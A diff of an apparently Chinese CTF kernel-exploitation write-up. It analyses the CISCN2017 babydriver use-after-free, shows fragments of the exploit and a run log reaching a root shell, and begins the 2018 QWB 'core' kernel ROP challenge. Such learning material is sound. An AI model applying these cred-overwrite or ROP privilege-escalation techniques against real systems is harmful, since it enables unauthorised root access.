 <p>把这个驱动文件拿出来。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -990,21 +923,20 @@ core <span class="o">[</span>master●<span class="o">]</span> bat init
 <pre class="chroma"><code class="language-bash" data-lang="bash">core <span class="o">[</span>master●<span class="o">]</span> cp ./lib/modules/4.4.72/babydriver.ko ..
 core <span class="o">[</span>master●<span class="o">]</span> <span class="nb">cd</span> ..
 CISCN2017_babydriver <span class="o">[</span>master●<span class="o">]</span> check ./babydriver.ko
-./babydriver.ko: ELF <span class="m">64</span>-bit LSB relocatable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, BuildID<span class="o">[</span>sha1<span class="o">]=</span>8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, with debug_info, not stripped
+./babydriver.ko: ELF 64-bit LSB relocatable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, BuildID<span class="o">[</span>sha1<span class="o">]=</span>8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, with debug_info, not stripped
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/m4x/pwn_repo/CISCN2017_babydriver/babydriver.ko&#39;</span>
     Arch:     amd64-64-little
     RELRO:    No RELRO
     Stack:    No canary found
     NX:       NX enabled
-    PIE:      No PIE <span class="o">(</span>0x0<span class="o">)</span></code></pre></td></tr></table>
+    PIE:      No PIE <span class="o">(</span>0x0<span class="o">)</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>没有开 PIE，无 canary 保护，没有去除符号表，很 nice。</p>
-
+</div><p>没有开 PIE，无 canary 保护，没有去除符号表，很 nice。</p>
 <p>用 IDA 打开分析，既然没有去除符号表，shift + F9 先看一下有什么结构体，可以发现如下的结构体：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1021,15 +953,14 @@ CISCN2017_babydriver <span class="o">[</span>master●<span class="o">]</span> c
 </span><span class="c"></span><span class="mi">00000008</span> <span class="no">device_buf_len</span>  <span class="no">dq</span> <span class="err">?</span>                    <span class="c">; XREF: babyopen+2D/w
 </span><span class="c"></span><span class="mi">00000008</span>                                         <span class="c">; babyioctl+3C/w ...
 </span><span class="c"></span><span class="mi">00000010</span> <span class="no">babydevice_t</span>    <span class="no">ends</span>
-<span class="err">00000010</span></code></pre></td></tr></table>
+<span class="err">00000010</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>再看一下主要函数</p>
-
+</div><p>再看一下主要函数</p>
 <p><strong>babyioctl:</strong> 定义了 0x10001 的命令，可以释放全局变量 babydev_struct 中的 device_buf，再根据用户传递的 size 重新申请一块内存，并设置 device_buf_len。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1072,13 +1003,13 @@ CISCN2017_babydriver <span class="o">[</span>master●<span class="o">]</span> c
   <span class="p">{</span>
     <span class="n">printk</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x013d</span><span class="s">efalut:arg is %ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v3</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
   <span class="p">}</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><strong>babyopen:</strong> 申请一块空间，大小为 0x40 字节，地址存储在全局变量 babydev_struct.device_buf 上，并更新 babydev_struct.device_buf_len</p>
+</div><p><strong>babyopen:</strong> 申请一块空间，大小为 0x40 字节，地址存储在全局变量 babydev_struct.device_buf 上，并更新 babydev_struct.device_buf_len</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1099,13 +1030,13 @@ CISCN2017_babydriver <span class="o">[</span>master●<span class="o">]</span> c
   <span class="n">babydev_struct</span><span class="p">.</span><span class="n">device_buf_len</span> <span class="o">=</span> <span class="mi">64LL</span><span class="p">;</span>
   <span class="n">printk</span><span class="p">(</span><span class="s">&#34;device open</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mh">0x24000C0LL</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><strong>babyread:</strong> 先检查长度是否小于 babydev_struct.device_buf_len，然后把 babydev_struct.device_buf 中的数据拷贝到 buffer 中，buffer 和长度都是用户传递的参数</p>
+</div><p><strong>babyread:</strong> 先检查长度是否小于 babydev_struct.device_buf_len，然后把 babydev_struct.device_buf 中的数据拷贝到 buffer 中，buffer 和长度都是用户传递的参数</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1128,13 +1059,13 @@ CISCN2017_babydriver <span class="o">[</span>master●<span class="o">]</span> c
     <span class="k">if</span> <span class="p">(</span> <span class="n">babydev_struct</span><span class="p">.</span><span class="n">device_buf_len</span> <span class="o">&gt;</span> <span class="n">v4</span> <span class="p">)</span>
       <span class="n">copy_to_user</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">babydev_struct</span><span class="p">.</span><span class="n">device_buf</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
   <span class="p">}</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><strong>babywrite:</strong> 类似 babyread，不同的是从 buffer 拷贝到全局变量中</p>
+</div><p><strong>babywrite:</strong> 类似 babyread，不同的是从 buffer 拷贝到全局变量中</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1157,13 +1088,13 @@ CISCN2017_babydriver <span class="o">[</span>master●<span class="o">]</span> c
     <span class="k">if</span> <span class="p">(</span> <span class="n">babydev_struct</span><span class="p">.</span><span class="n">device_buf_len</span> <span class="o">&gt;</span> <span class="n">v4</span> <span class="p">)</span>
       <span class="n">copy_from_user</span><span class="p">(</span><span class="n">babydev_struct</span><span class="p">.</span><span class="n">device_buf</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
   <span class="p">}</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><strong>babyrelease:</strong> 释放空间，没什么好说的</p>
+</div><p><strong>babyrelease:</strong> 释放空间，没什么好说的</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1182,23 +1113,18 @@ CISCN2017_babydriver <span class="o">[</span>master●<span class="o">]</span> c
   <span class="n">kfree</span><span class="p">(</span><span class="n">babydev_struct</span><span class="p">.</span><span class="n">device_buf</span><span class="p">);</span>
   <span class="n">printk</span><span class="p">(</span><span class="s">&#34;device release</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">filp</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>还有 babydriver_init() 和 babydriver_exit() 两个函数分别完成了 <strong>/dev/babydev</strong> 设备的初始化和清理，查一下函数的用法即可，不再分析。</p>
-
+</div><p>还有 babydriver_init() 和 babydriver_exit() 两个函数分别完成了 <strong>/dev/babydev</strong> 设备的初始化和清理，查一下函数的用法即可，不再分析。</p>
 <h4 id="思路">思路</h4>
-
 <p>没有用户态传统的溢出等漏洞，但存在一个伪条件竞争引发的 UAF 漏洞。</p>
-
 <p>也就是说如果我们同时打开两个设备，第二次会覆盖第一次分配的空间，因为 babydev_struct 是全局的。同样，如果释放第一个，那么第二个其实是被是释放过得，这样就造成了一个 UAF。</p>
-
 <p>那么有了 UAF 要怎么用呢？根据之前的分析，可以修改进程的 cred 结构。</p>
-
 <p>其中 4.4.72 的 cred 结构体 <a href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118">定义</a> 如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1277,25 +1203,21 @@ CISCN2017_babydriver <span class="o">[</span>master●<span class="o">]</span> c
 	<span class="k">struct</span> <span class="n">user_namespace</span> <span class="o">*</span><span class="n">user_ns</span><span class="p">;</span> <span class="cm">/* user_ns the caps and keyrings are relative to. */</span>
 	<span class="k">struct</span> <span class="n">group_info</span> <span class="o">*</span><span class="n">group_info</span><span class="p">;</span>	<span class="cm">/* supplementary groups for euid/fsgid */</span>
 	<span class="k">struct</span> <span class="n">rcu_head</span>	<span class="n">rcu</span><span class="p">;</span>		<span class="cm">/* RCU deletion hook */</span>
-<span class="p">};</span></code></pre></td></tr></table>
+<span class="p">};</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>那么根据 UAF 的思想，思路如下：</p>
-
+</div><p>那么根据 UAF 的思想，思路如下：</p>
 <ol>
 <li>打开两次设备，通过 ioctl 更改其大小为 cred 结构体的大小</li>
 <li>释放其中一个，fork 一个新进程，那么这个新进程的 cred 的空间就会和之前释放的空间重叠</li>
 <li>同时，我们可以通过另一个文件描述符对这块空间写，只需要将 uid，gid 改为 0，即可以实现提权到 root</li>
 </ol>
-
 <p>需要确定 cred 结构体的大小，有了源码，大小就很好确定了。计算一下是 0x8a（注意使用相同内核版本的源码）。</p>
-
 <h4 id="exploit">Exploit</h4>
-
 <p>注释都写在代码里了，<a href="https://github.com/bash-c/pwn_repo/blob/master/CISCN2017_babydriver/exploit.c">exploit here</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1398,13 +1320,13 @@ CISCN2017_babydriver <span class="o">[</span>master●<span class="o">]</span> c
 	<span class="n">close</span><span class="p">(</span><span class="n">fd2</span><span class="p">);</span>
 
 	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<h4 id="get-root-shell">get root shell</h4>
+</div><h4 id="get-root-shell">get root shell</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1433,12 +1355,13 @@ CISCN2017_babydriver <span class="o">[</span>master●<span class="o">]</span> c
 </span><span class="lnt">27
 </span><span class="lnt">28
 </span><span class="lnt">29
+</span><span class="lnt">30
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">// 静态编译文件，kernel 中没有 libc
 CISCN2017_babydriver <span class="o">[</span>master●●<span class="o">]</span> gcc exploit.c -static -o exploit
 CISCN2017_babydriver <span class="o">[</span>master●●<span class="o">]</span> file exploit
-exploit: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>GNU/Linux<span class="o">)</span>, statically linked, <span class="k">for</span> GNU/Linux <span class="m">3</span>.2.0, BuildID<span class="o">[</span>sha1<span class="o">]=</span>90aabed5497b6922fda3d5118e4aa9cb2fa5ccc5, not stripped
+exploit: ELF 64-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>GNU/Linux<span class="o">)</span>, statically linked, <span class="k">for</span> GNU/Linux 3.2.0, BuildID<span class="o">[</span>sha1<span class="o">]=</span>90aabed5497b6922fda3d5118e4aa9cb2fa5ccc5, not stripped
 // 把编译好的 exp 解压后的目录下，重新打包 rootfs.cpio
 CISCN2017_babydriver <span class="o">[</span>master●●<span class="o">]</span> cp exploit core/tmp 
 CISCN2017_babydriver <span class="o">[</span>master●●<span class="o">]</span> <span class="nb">cd</span> core 
@@ -1454,78 +1377,74 @@ CISCN2017_babydriver <span class="o">[</span>master●●<span class="o">]</span
 / $ ls /tmp/
 exploit
 / $ id
-<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>ctf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>ctf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>ctf<span class="o">)</span>
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span>
 / $ /tmp/exploit
-<span class="o">[</span>   <span class="m">14</span>.376187<span class="o">]</span> device open
-<span class="o">[</span>   <span class="m">14</span>.376715<span class="o">]</span> device open
-<span class="o">[</span>   <span class="m">14</span>.377201<span class="o">]</span> alloc <span class="k">done</span>
-<span class="o">[</span>   <span class="m">14</span>.377629<span class="o">]</span> device release
+<span class="o">[</span>   14.376187<span class="o">]</span> device open
+<span class="o">[</span>   14.376715<span class="o">]</span> device open
+<span class="o">[</span>   14.377201<span class="o">]</span> alloc <span class="k">done</span>
+<span class="o">[</span>   14.377629<span class="o">]</span> device release
 <span class="o">[</span>+<span class="o">]</span> root now.
 / <span class="c1"># id</span>
-<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>ctf<span class="o">)</span>
-/ #</code></pre></td></tr></table>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span>
+/ <span class="c1">#</span>
+
+</code></pre></td></tr></table>
 </div>
-</div>
-<blockquote>
+</div><blockquote>
 <p>在后来的学习中，发现使用 <a href="http://blog.vmsplice.net/2011/09/how-to-share-files-instantly-between.html">SimpleHTTPServer</a> 来传输文件更加方便快捷。</p>
 </blockquote>
-
 <p>当然也可以用 rop 来做，放到下一篇分析</p>
-
-<h3 id="kernel-rop-2018强网杯-core">kernel ROP - 2018强网杯 - core</h3>
-
+<h3 id="kernel-rop---2018强网杯---core">kernel ROP - 2018强网杯 - core</h3>
 <h4 id="分析-1">分析</h4>
-
 <p>题目给了 <code>bzImage</code>，<code>core.cpio</code>，<code>start.sh</code> 以及带符号表的 <code>vmlinux</code> 四个文件</p>
-
 <p>前三个文件我们已经知道了作用，<code>vmlinux</code> 则是静态编译，未经过压缩的 kernel 文件，相对应的 <code>bzImage</code> 可以理解为压缩后的文件，更详细的可以看 <a href="https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml">stackexchange</a></p>
-
 <p>vmlinux 未经过压缩，也就是说我们可以从 vmlinux 中找到一些 gadget，我们先把 gadget 保存下来备用。</p>
-
 <blockquote>
 <p>建议使用 <a href="https://github.com/sashs/Ropper">Ropper</a> 来寻找 gadget，在我测试时，ropper 用了两分半钟提取出了所有的 gadget，而 <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> 用了半个小时耗尽了内存还没跑出结果。。。</p>
 </blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">give_to_player <span class="o">[</span>master●<span class="o">]</span> <span class="nb">time</span> ropper --file ./vmlinux --nocolor &gt; g1
 <span class="o">[</span>INFO<span class="o">]</span> Load gadgets from cache
-<span class="o">[</span>LOAD<span class="o">]</span> loading... <span class="m">100</span>%
-<span class="o">[</span>LOAD<span class="o">]</span> removing double gadgets... <span class="m">100</span>%
-ropper --file ./vmlinux --nocolor &gt; g1  <span class="m">147</span>.42s user <span class="m">25</span>.68s system <span class="m">111</span>% cpu <span class="m">2</span>:35.17 total
+<span class="o">[</span>LOAD<span class="o">]</span> loading... 100%
+<span class="o">[</span>LOAD<span class="o">]</span> removing double gadgets... 100%
+ropper --file ./vmlinux --nocolor &gt; g1  147.42s user 25.68s system 111% cpu 2:35.17 total
 
 give_to_player <span class="o">[</span>master●<span class="o">]</span> <span class="nb">time</span> ROPgadget --binary ./vmlinux &gt; g2
-<span class="o">[</span><span class="m">2</span><span class="o">]</span>    <span class="m">16597</span> killed     ROPgadget --binary ./vmlinux &gt; g2
-ROPgadget --binary ./vmlinux &gt; g2  <span class="m">1064</span>.39s user <span class="m">42</span>.52s system <span class="m">54</span>% cpu <span class="m">33</span>:35.89 total</code></pre></td></tr></table>
+<span class="o">[</span>2<span class="o">]</span>    <span class="m">16597</span> killed     ROPgadget --binary ./vmlinux &gt; g2
+ROPgadget --binary ./vmlinux &gt; g2  1064.39s user 42.52s system 54% cpu 33:35.89 total
+
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>如果题目没有给 vmlinux，可以通过 <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a> 提取。</p>
+</div><p>如果题目没有给 vmlinux，可以通过 <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a> 提取。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">CISCN2017_babydriver <span class="o">[</span>master●●<span class="o">]</span> ./extract-vmlinux ./bzImage &gt; vmlinux
 CISCN2017_babydriver <span class="o">[</span>master●●<span class="o">]</span> file vmlinux 
-vmlinux: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, BuildID<span class="o">[</span>sha1<span class="o">]=</span>e993ea9809ee28d059537a0d5e866794f27e33b4, stripped</code></pre></td></tr></table>
+vmlinux: ELF 64-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, BuildID<span class="o">[</span>sha1<span class="o">]=</span>e993ea9809ee28d059537a0d5e866794f27e33b4, stripped
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>看一下 start.sh</p>
+</div><p>看一下 start.sh</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1556,15 +1475,14 @@ give_to_player <span class="o">[</span>master●●<span class="o">]</span> bat 
 </span><span class="se"></span>   <span class="m">6</span>   │ -s  <span class="se">\
 </span><span class="se"></span>   <span class="m">7</span>   │ -netdev user,id<span class="o">=</span>t0, -device e1000,netdev<span class="o">=</span>t0,id<span class="o">=</span>nic0 <span class="se">\
 </span><span class="se"></span>   <span class="m">8</span>   │ -nographic  <span class="se">\
-</span><span class="se"></span>───────┴─────────────────────────────────────────────────────────────────────────────────</code></pre></td></tr></table>
+</span><span class="se"></span>───────┴─────────────────────────────────────────────────────────────────────────────────
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>发现内核开启了 kaslr 保护。</p>
-
+</div><p>发现内核开启了 kaslr 保护。</p>
 <p>解压 <code>core.cpio</code> 后，看一下 init</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1604,7 +1522,7 @@ give_to_player <span class="o">[</span>master●●<span class="o">]</span> bat 
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">give_to_player <span class="o">[</span>master●<span class="o">]</span> file core.cpio 
-core.cpio: gzip compressed data, last modified: Fri Mar <span class="m">23</span> <span class="m">13</span>:41:13 <span class="m">2018</span>, max compression, from Unix, original size <span class="m">53442048</span>
+core.cpio: gzip compressed data, last modified: Fri Mar <span class="m">23</span> 13:41:13 2018, max compression, from Unix, original size <span class="m">53442048</span>
 give_to_player <span class="o">[</span>master●<span class="o">]</span> mkdir core
 give_to_player <span class="o">[</span>master●<span class="o">]</span> <span class="nb">cd</span> core 
 core <span class="o">[</span>master<span class="o">]</span> mv ../core.cpio core.cpio.gz
@@ -1615,21 +1533,21 @@ core <span class="o">[</span>master●<span class="o">]</span> bat init
 ───────┬─────────────────────────────────────────────────────────────────────────────────
        │ File: init
 ───────┼─────────────────────────────────────────────────────────────────────────────────
-   <span class="m">1</span>   │ <span class="cp">#!/bin/sh
-</span><span class="cp"></span>   <span class="m">2</span>   │ mount -t proc proc /proc
+   <span class="m">1</span>   │ <span class="c1">#!/bin/sh</span>
+   <span class="m">2</span>   │ mount -t proc proc /proc
    <span class="m">3</span>   │ mount -t sysfs sysfs /sys
    <span class="m">4</span>   │ mount -t devtmpfs none /dev
    <span class="m">5</span>   │ /sbin/mdev -s
    <span class="m">6</span>   │ mkdir -p /dev/pts
-   <span class="m">7</span>   │ mount -vt devpts -o <span class="nv">gid</span><span class="o">=</span><span class="m">4</span>,mode<span class="o">=</span><span class="m">620</span> none /dev/pts
+   <span class="m">7</span>   │ mount -vt devpts -o <span class="nv">gid</span><span class="o">=</span>4,mode<span class="o">=</span><span class="m">620</span> none /dev/pts
    <span class="m">8</span>   │ chmod <span class="m">666</span> /dev/ptmx
    <span class="m">9</span>   │ cat /proc/kallsyms &gt; /tmp/kallsyms
   <span class="m">10</span>   │ <span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/kernel/kptr_restrict
   <span class="m">11</span>   │ <span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/kernel/dmesg_restrict
   <span class="m">12</span>   │ ifconfig eth0 up
   <span class="m">13</span>   │ udhcpc -i eth0
-  <span class="m">14</span>   │ ifconfig eth0 <span class="m">10</span>.0.2.15 netmask <span class="m">255</span>.255.255.0
-  <span class="m">15</span>   │ route add default gw <span class="m">10</span>.0.2.2 
+  <span class="m">14</span>   │ ifconfig eth0 10.0.2.15 netmask 255.255.255.0
+  <span class="m">15</span>   │ route add default gw 10.0.2.2 
   <span class="m">16</span>   │ insmod /core.ko
   <span class="m">17</span>   │ 
   <span class="m">18</span>   │ poweroff -d <span class="m">120</span> -f <span class="p">&amp;</span>
@@ -1639,22 +1557,20 @@ core <span class="o">[</span>master●<span class="o">]</span> bat init
   <span class="m">22</span>   │ umount /sys
   <span class="m">23</span>   │ 
   <span class="m">24</span>   │ poweroff -d <span class="m">0</span>  -f
-───────┴────────────────────────────</code></pre></td></tr></table>
+───────┴────────────────────────────
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>发现了几处有意思的地方：</p>
-
+</div><p>发现了几处有意思的地方：</p>
 <ul>
 <li>第 9 行中把 <code>kallsyms</code> 的内容保存到了 <code>/tmp/kallsyms</code> 中，那么我们就能从 <code>/tmp/kallsyms</code> 中读取 <code>commit_creds</code>，<code>prepare_kernel_cred</code> 的函数的地址了</li>
 <li>第 10 行把 <code>kptr_restrict</code> 设为 1，这样就不能通过 <code>/proc/kallsyms</code> 查看函数地址了，但第 9 行已经把其中的信息保存到了一个可读的文件中，这句就无关紧要了</li>
 <li>第 11 行把 <code>dmesg_restrict</code> 设为 1，这样就不能通过 <code>dmesg</code> 查看 kernel 的信息了</li>
 <li>第 18 行设置了定时关机，为了避免做题时产生干扰，直接把这句删掉然后重新打包</li>
 </ul>
-
 <p>同时还发现了一个 shell 脚本 <code>gen_cpio.sh</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1671,13 +1587,13 @@ core <span class="o">[</span>master●<span class="o">]</span> bat init
    <span class="m">1</span>   │ find . -print0 <span class="se">\
 </span><span class="se"></span>   <span class="m">2</span>   │ <span class="p">|</span> cpio --null -ov --format<span class="o">=</span>newc <span class="se">\
 </span><span class="se"></span>   <span class="m">3</span>   │ <span class="p">|</span> gzip -9 &gt; <span class="nv">$1</span>
-───────┴─────────────────────────────────────────────────────────────────────────────────</code></pre></td></tr></table>
+───────┴─────────────────────────────────────────────────────────────────────────────────
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>从名称和内容都可以看出这是一个方便打包的脚本，我们修改好 init 后重新打包，尝试运行 kernel</p>
+</div><p>从名称和内容都可以看出这是一个方便打包的脚本，我们修改好 init 后重新打包，尝试运行 kernel</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1714,13 +1630,13 @@ bin        core.ko  gen_cpio.sh  lib    linuxrc  root  sys  usr
 core.cpio  etc      init         lib64  proc     sbin  tmp  vmlinux
 core <span class="o">[</span>master●●<span class="o">]</span> mv core.cpio ..
 core <span class="o">[</span>master●●<span class="o">]</span> <span class="nb">cd</span> ..
-give_to_player <span class="o">[</span>master●●<span class="o">]</span> ./start.sh </code></pre></td></tr></table>
+give_to_player <span class="o">[</span>master●●<span class="o">]</span> ./start.sh 
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>但这时候又遇到了新问题，内核运行不起来，从一闪即逝的报错信息中能看到是因为分配的内存过小，<code>start.sh</code> 中 <code>-m</code> 分配的是 64M，修改为 128M，终于能运行起来了。</p>
+</div><p>但这时候又遇到了新问题，内核运行不起来，从一闪即逝的报错信息中能看到是因为分配的内存过小，<code>start.sh</code> 中 <code>-m</code> 分配的是 64M，修改为 128M，终于能运行起来了。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1741,21 +1657,20 @@ core <span class="m">16384</span> <span class="m">0</span> - Live 0x000000000000
 ......
 give_to_player <span class="o">[</span>master●●<span class="o">]</span> cp core/core.ko .
 give_to_player <span class="o">[</span>master●●<span class="o">]</span> check ./core.ko
-./core.ko: ELF <span class="m">64</span>-bit LSB relocatable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, BuildID<span class="o">[</span>sha1<span class="o">]=</span>549436683d
